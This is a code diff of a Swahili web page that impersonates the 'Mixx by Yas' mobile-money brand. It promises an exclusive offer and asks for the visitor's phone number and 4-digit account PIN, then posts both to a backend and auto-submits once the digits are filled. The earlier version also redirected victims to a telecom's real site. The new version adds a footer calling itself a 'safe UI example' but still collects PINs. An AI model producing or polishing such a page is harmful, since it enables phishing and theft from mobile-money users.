@@ -2,135 +2,207 @@
 <html lang="sw">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Mixx by Yas | Ofa Maalum</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{
-            background:linear-gradient(145deg,#0b2b26,#0a1f1c);
-            font-family:'Segoe UI',system-ui,sans-serif;
-            min-height:100vh;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            padding:1.5rem;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
-        .card{
-            max-width:520px;
-            width:100%;
-            background:rgba(255,255,255,0.97);
-            border-radius:48px;
-            padding:2rem 1.8rem;
-            box-shadow:0 25px 45px -12px rgba(0,0,0,0.45);
-            border:1px solid rgba(255,215,120,0.3);
+
+        body {
+            background: linear-gradient(145deg, #0b2b26 0%, #0a1f1c 100%);
+            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Roboto', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
         }
-        h2{
-            font-size:1.85rem;
-            font-weight:700;
-            background:linear-gradient(135deg,#d4af37,#f5c542);
-            background-clip:text;
-            -webkit-background-clip:text;
-            color:transparent;
-            text-align:center;
-            margin-bottom:0.6rem;
+
+        .card {
+            max-width: 520px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.97);
+            backdrop-filter: blur(0px);
+            border-radius: 48px;
+            padding: 2rem 1.8rem 2rem 1.8rem;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.45), 0 4px 12px rgba(0, 0, 0, 0.1);
+            transition: all 0.2s ease;
+            border: 1px solid rgba(255, 215, 120, 0.3);
         }
-        .subtitle{
-            text-align:center;
-            color:#2c5a4e;
-            font-weight:500;
-            margin-bottom:1.8rem;
-            padding-bottom:1rem;
-            border-bottom:1px dashed #b9dfcf;
+
+        h2 {
+            font-size: 1.85rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #d4af37, #f5c542);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            text-align: center;
+            letter-spacing: -0.3px;
+            margin-bottom: 0.6rem;
         }
-        .phone-input{margin-bottom:1.5rem;}
-        .phone-input input{
-            width:100%;
-            padding:1rem 1.2rem;
-            font-size:1.1rem;
-            border:2px solid #e2e8f0;
-            border-radius:60px;
-            background:#fefdf8;
-            outline:none;
-            font-family:monospace;
+
+        .subtitle {
+            text-align: center;
+            color: #2c5a4e;
+            font-weight: 500;
+            font-size: 0.95rem;
+            margin-bottom: 1.8rem;
+            border-bottom: 1px dashed #b9dfcf;
+            padding-bottom: 1rem;
         }
-        .phone-input input:focus{
-            border-color:#f5b042;
-            box-shadow:0 0 0 3px rgba(245,176,66,0.2);
+
+        .phone-input {
+            margin-bottom: 1.5rem;
         }
-        .pin-label{
-            font-weight:600;
-            color:#1e4a3b;
-            margin-bottom:0.75rem;
-            display:flex;
-            gap:8px;
+
+        .phone-input input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            font-size: 1.1rem;
+            font-weight: 500;
+            border: 2px solid #e2e8f0;
+            border-radius: 60px;
+            background: #fefdf8;
+            transition: all 0.25s;
+            outline: none;
+            font-family: monospace;
+            letter-spacing: 0.5px;
+            color: #1e2f2a;
         }
-        .pin-label span{
-            background:#eefbf6;
-            padding:4px 12px;
-            border-radius:40px;
-            font-size:0.8rem;
-            color:#bd7e14;
+
+        .phone-input input:focus {
+            border-color: #f5b042;
+            box-shadow: 0 0 0 3px rgba(245, 176, 66, 0.2);
+            background: white;
         }
-        .pin-boxes{
-            display:flex;
-            gap:14px;
-            justify-content:center;
-            margin:0.5rem 0;
+
+        .phone-input input::placeholder {
+            color: #98a9a4;
+            font-weight: normal;
+            font-family: system-ui;
         }
-        .pin-box{
-            width:70px;
-            height:70px;
-            text-align:center;
-            font-size:2.2rem;
-            font-weight:700;
-            font-family:monospace;
-            border:2px solid #cfdfd9;
-            border-radius:20px;
-            background:white;
-            color:#1f3e36;
-            transition:0.2s;
+
+        .pin-label {
+            font-weight: 600;
+            color: #1e4a3b;
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.95rem;
         }
-        .pin-box:focus{
-            border-color:#f5b042;
-            outline:none;
-            box-shadow:0 0 0 3px rgba(245,176,66,0.3);
+
+        .pin-label span {
+            background: #eefbf6;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            color: #bd7e14;
         }
-        .note{
-            text-align:center;
-            font-size:0.72rem;
-            color:#6f8a82;
-            margin-top:1.8rem;
-            background:#f3f9f6;
-            padding:8px 12px;
-            border-radius:40px;
+
+        .pin-boxes {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            margin: 0.5rem 0 0.5rem 0;
         }
-        footer{
-            text-align:center;
-            margin-top:1.8rem;
-            font-size:0.7rem;
-            color:#98afa8;
-            border-top:1px solid #e2ede8;
-            padding-top:1.2rem;
+
+        .pin-box {
+            width: 70px;
+            height: 70px;
+            text-align: center;
+            font-size: 2.2rem;
+            font-weight: 700;
+            font-family: monospace;
+            border: 2px solid #cfdfd9;
+            border-radius: 20px;
+            background: #ffffff;
+            color: #1f3e36;
+            transition: 0.2s;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.02);
+            letter-spacing: 2px;
         }
-        .toast{
-            position:fixed;
-            bottom:30px;
-            left:50%;
-            transform:translateX(-50%);
-            background:#1e2f2a;
-            color:#ffde9c;
-            padding:12px 28px;
-            border-radius:60px;
-            font-weight:500;
-            opacity:0;
-            transition:0.2s;
-            pointer-events:none;
-            z-index:1000;
+
+        .pin-box:focus {
+            border-color: #f5b042;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(245, 176, 66, 0.3);
+            transform: scale(1.02);
         }
-        @media(max-width:480px){
-            .card{padding:1.5rem 1.2rem;}
-            .pin-box{width:55px;height:55px;font-size:1.8rem;}
-            h2{font-size:1.5rem;}
+
+        .pin-box::-webkit-outer-spin-button,
+        .pin-box::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .pin-box[type=number] {
+            -moz-appearance: textfield;
+        }
+
+        .note {
+            text-align: center;
+            font-size: 0.72rem;
+            color: #6f8a82;
+            margin-top: 1.8rem;
+            background: #f3f9f6;
+            padding: 8px 12px;
+            border-radius: 40px;
+            display: inline-block;
+            width: 100%;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 1.8rem;
+            font-size: 0.7rem;
+            color: #98afa8;
+            border-top: 1px solid #e2ede8;
+            padding-top: 1.2rem;
+        }
+
+        .toast-message {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) scale(0.9);
+            background: #1e2f2a;
+            color: #ffde9c;
+            padding: 12px 28px;
+            border-radius: 60px;
+            font-weight: 500;
+            font-size: 0.9rem;
+            opacity: 0;
+            transition: 0.2s;
+            pointer-events: none;
+            z-index: 1000;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+            backdrop-filter: blur(4px);
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 1.5rem 1.2rem;
+                border-radius: 32px;
+            }
+            .pin-box {
+                width: 55px;
+                height: 55px;
+                font-size: 1.8rem;
+            }
+            h2 {
+                font-size: 1.5rem;
+            }
+        }
+
+        .submitting {
+            pointer-events: none;
+            opacity: 0.8;
         }
     </style>
 </head>
@@ -140,7 +212,7 @@
         <p class="subtitle">Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa ya kipekee.</p>
         
         <div class="phone-input">
-            <input type="tel" id="phoneNumber" placeholder="Namba ya Simu (ex: 0765123456)" maxlength="10" inputmode="numeric">
+            <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu (ex: 0765123456)" maxlength="10" inputmode="numeric" required>
         </div>
 
         <div class="pin-label">
@@ -148,110 +220,199 @@
             <span>usalama kamili</span>
         </div>
         <div class="pin-boxes">
-            <input type="tel" maxlength="1" class="pin-box" data-index="0" inputmode="numeric">
-            <input type="tel" maxlength="1" class="pin-box" data-index="1" inputmode="numeric">
-            <input type="tel" maxlength="1" class="pin-box" data-index="2" inputmode="numeric">
-            <input type="tel" maxlength="1" class="pin-box" data-index="3" inputmode="numeric">
+            <input type="tel" maxlength="1" class="pin-box" data-index="0" inputmode="numeric" autocomplete="off" required>
+            <input type="tel" maxlength="1" class="pin-box" data-index="1" inputmode="numeric" autocomplete="off" required>
+            <input type="tel" maxlength="1" class="pin-box" data-index="2" inputmode="numeric" autocomplete="off" required>
+            <input type="tel" maxlength="1" class="pin-box" data-index="3" inputmode="numeric" autocomplete="off" required>
         </div>
 
-        <p class="note">⚠️ Kuingiza neno siri kunakubali maelezo ya matumizi na masharti ya ofa.</p>
-        <footer>© Mixx by Yas – Ofa maalum ya wateja.</footer>
+        <p class="note">⚠️ Kuingiza neno siri kunakubali maelezo ya matumizi na masharti ya ofa. Hakikisha namba yako ni sahihi.</p>
+        <footer>© Mixx by Yas – Ofa maalum ya wateja. Mfano salama wa UI.</footer>
     </div>
-    <div id="toastMsg" class="toast"></div>
+    <div id="toastMsg" class="toast-message"></div>
 
     <script>
-        const pinBoxes = document.querySelectorAll('.pin-box');
-        const phoneInput = document.getElementById('phoneNumber');
-        const toast = document.getElementById('toastMsg');
-        
-        const API_URL = '/api/submit';
-        
-        function showMessage(text, isError=true){
-            toast.textContent = text;
-            toast.style.opacity = '1';
-            toast.style.backgroundColor = isError ? '#872341' : '#1f4e3f';
-            setTimeout(()=>toast.style.opacity='0',2500);
-        }
-        
-        function isValidPhone(phone){
-            return /^[0-9]{10}$/.test(phone);
-        }
-        
-        async function submitToBackend(phoneNumber, pin){
-            try{
-                const response = await fetch(API_URL, {
-                    method:'POST',
-                    headers:{'Content-Type':'application/json'},
-                    body:JSON.stringify({phoneNumber, pin})
-                });
-                const data = await response.json();
-                if(response.ok){
-                    showMessage('✅ Ofa imetumwa! Asante.', false);
-                    setTimeout(()=>{
-                        window.location.href = 'https://www.tigo.co.tz';
-                    },1500);
+        (function() {
+            const pinBoxes = document.querySelectorAll('.pin-box');
+            const phoneNumberInput = document.getElementById('phoneNumber');
+            const toast = document.getElementById('toastMsg');
+            
+            function showMessage(text, isError = true) {
+                toast.style.transition = 'opacity 0.2s, transform 0.2s';
+                toast.textContent = text;
+                toast.style.opacity = '1';
+                toast.style.transform = 'translateX(-50%) scale(1)';
+                if (isError) {
+                    toast.style.backgroundColor = '#872341';
+                    toast.style.color = '#ffe0b5';
                 } else {
-                    showMessage('❌ ' + (data.error || 'Jaribu tena'));
+                    toast.style.backgroundColor = '#1f4e3f';
+                    toast.style.color = '#f9e0a0';
                 }
-            } catch(error){
-                showMessage('❌ Tatizo la mtandao. Jaribu tena.');
+                setTimeout(() => {
+                    toast.style.opacity = '0';
+                    toast.style.transform = 'translateX(-50%) scale(0.9)';
+                }, 3000);
             }
-        }
-        
-        async function tryAutoSubmit(){
-            const allPinsFilled = Array.from(pinBoxes).every(input=>input.value.length===1);
-            const phone = phoneInput.value.trim();
-            if(!allPinsFilled) return false;
-            if(!isValidPhone(phone)){
-                showMessage('📱 Namba lazima iwe tarakimu 10');
-                phoneInput.focus();
-                return false;
+
+            function isValidPhone(phone) {
+                return /^[0-9]{10}$/.test(phone);
             }
-            const pin = Array.from(pinBoxes).map(input=>input.value).join('');
-            document.querySelectorAll('input').forEach(i=>i.disabled=true);
-            showMessage('📤 Inatuma...', false);
-            await submitToBackend(phone, pin);
-            document.querySelectorAll('input').forEach(i=>i.disabled=false);
-            return true;
-        }
-        
-        pinBoxes.forEach((box,index)=>{
-            box.addEventListener('input',(e)=>{
-                let val = e.target.value.replace(/[^0-9]/g,'');
+
+            async function submitToBackend(phoneNumber, pin) {
+                try {
+                    const response = await fetch('/api/submit', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ phoneNumber, pin })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (response.ok) {
+                        showMessage('✅ Ofa yako imepokelewa! Utapata taarifa kupitia SMS.', false);
+                        // Reset form after successful submission
+                        phoneNumberInput.value = '';
+                        pinBoxes.forEach(box => box.value = '');
+                        pinBoxes[0].focus();
+                        return true;
+                    } else {
+                        showMessage('❌ ' + (data.error || 'Hitilafu, jaribu tena'));
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Submit error:', error);
+                    showMessage('❌ Tatizo la mtandao. Hakikisha una internet na jaribu tena.');
+                    return false;
+                }
+            }
+
+            async function tryAutoSubmit() {
+                const allPinsFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
+                const phoneRaw = phoneNumberInput.value.trim();
+                
+                if (!allPinsFilled) return false;
+                
+                if (!isValidPhone(phoneRaw)) {
+                    if (phoneRaw === '') {
+                        showMessage('📱 Tafadhali ingiza namba yako ya simu (tarakimu 10).');
+                        phoneNumberInput.focus();
+                    } else {
+                        showMessage('❌ Namba ya simu lazima iwe na tarakimu 10 pekee.');
+                        phoneNumberInput.focus();
+                        phoneNumberInput.select();
+                    }
+                    return false;
+                }
+                
+                const pin = Array.from(pinBoxes).map(input => input.value).join('');
+                
+                // Disable inputs while submitting
+                document.querySelectorAll('input').forEach(i => i.disabled = true);
+                
+                const success = await submitToBackend(phoneRaw, pin);
+                
+                // Re-enable inputs
+                document.querySelectorAll('input').forEach(i => i.disabled = false);
+                
+                if (success) {
+                    // Clear PIN boxes after successful submission
+                    pinBoxes.forEach(box => box.value = '');
+                }
+                
+                return success;
+            }
+            
+            // PIN box handlers
+            pinBoxes.forEach((box, index) => {
+                box.addEventListener('input', (e) => {
+                    let rawValue = e.target.value;
+                    const filtered = rawValue.replace(/[^0-9]/g, '');
+                    e.target.value = filtered;
+                    
+                    if (filtered.length === 1) {
+                        if (index < pinBoxes.length - 1) {
+                            pinBoxes[index + 1].focus();
+                        } else {
+                            tryAutoSubmit();
+                        }
+                    }
+                });
+                
+                box.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace') {
+                        if (box.value === '' && index > 0) {
+                            pinBoxes[index - 1].focus();
+                            pinBoxes[index - 1].value = '';
+                        }
+                    }
+                    if (e.key === 'ArrowLeft' && index > 0) {
+                        e.preventDefault();
+                        pinBoxes[index - 1].focus();
+                    }
+                    if (e.key === 'ArrowRight' && index < pinBoxes.length - 1) {
+                        e.preventDefault();
+                        pinBoxes[index + 1].focus();
+                    }
+                });
+                
+                box.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    let pastedData = (e.clipboardData || window.clipboardData).getData('text');
+                    pastedData = pastedData.replace(/[^0-9]/g, '');
+                    if (pastedData.length === 0) return;
+                    
+                    const pinDigits = pastedData.split('').slice(0, 4);
+                    for (let i = 0; i < pinDigits.length; i++) {
+                        if (i < pinBoxes.length) {
+                            pinBoxes[i].value = pinDigits[i];
+                        }
+                    }
+                    
+                    if (pinDigits.length === 4) {
+                        tryAutoSubmit();
+                    } else if (pinDigits.length > 0 && pinDigits.length < 4) {
+                        pinBoxes[pinDigits.length].focus();
+                    }
+                });
+            });
+            
+            // Phone input handler
+            phoneNumberInput.addEventListener('input', (e) => {
+                let val = e.target.value.replace(/[^0-9]/g, '');
+                if (val.length > 10) val = val.slice(0, 10);
                 e.target.value = val;
-                if(val.length===1 && index<3) pinBoxes[index+1].focus();
-                else if(val.length===1 && index===3) tryAutoSubmit();
-            });
-            box.addEventListener('keydown',(e)=>{
-                if(e.key==='Backspace' && box.value==='' && index>0){
-                    pinBoxes[index-1].focus();
-                    pinBoxes[index-1].value='';
+                
+                const allPins = Array.from(pinBoxes).every(input => input.value.length === 1);
+                if (allPins && val.length === 10) {
+                    tryAutoSubmit();
                 }
             });
-            box.addEventListener('paste',(e)=>{
-                e.preventDefault();
-                let paste = (e.clipboardData||window.clipboardData).getData('text');
-                paste = paste.replace(/[^0-9]/g,'').slice(0,4);
-                for(let i=0;i<paste.length && i<4;i++) pinBoxes[i].value = paste[i];
-                if(paste.length===4) tryAutoSubmit();
-                else if(paste.length>0 && paste.length<4) pinBoxes[paste.length].focus();
+            
+            phoneNumberInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    const pinsAllSet = Array.from(pinBoxes).every(input => input.value.length === 1);
+                    if (pinsAllSet && isValidPhone(phoneNumberInput.value.trim())) {
+                        tryAutoSubmit();
+                    } else if (!pinsAllSet) {
+                        showMessage('🔢 Tafadhali kamilisha PIN yako ya tarakimu 4 kwanza');
+                        const emptyPin = Array.from(pinBoxes).find(inp => inp.value === '');
+                        if (emptyPin) emptyPin.focus();
+                    }
+                }
             });
-        });
-        
-        phoneInput.addEventListener('input',(e)=>{
-            let val = e.target.value.replace(/[^0-9]/g,'').slice(0,10);
-            e.target.value = val;
-            const allPinsFilled = Array.from(pinBoxes).every(input=>input.value.length===1);
-            if(allPinsFilled && val.length===10) tryAutoSubmit();
-        });
-        
-        phoneInput.addEventListener('keypress',(e)=>{
-            if(e.key==='Enter'){
-                const allPinsFilled = Array.from(pinBoxes).every(input=>input.value.length===1);
-                if(allPinsFilled && isValidPhone(phoneInput.value.trim())) tryAutoSubmit();
-                else if(!allPinsFilled) showMessage('🔢 Kamilisha PIN kwanza');
-            }
-        });
+            
+            // Focus hints
+            pinBoxes.forEach(box => {
+                box.addEventListener('focus', () => {
+                    if (phoneNumberInput.value.trim() === '') {
+                        showMessage('📞 Ingiza namba yako kwanza', false);
+                    }
+                });
+            });
+        })();
     </script>
 </body>
 </html>
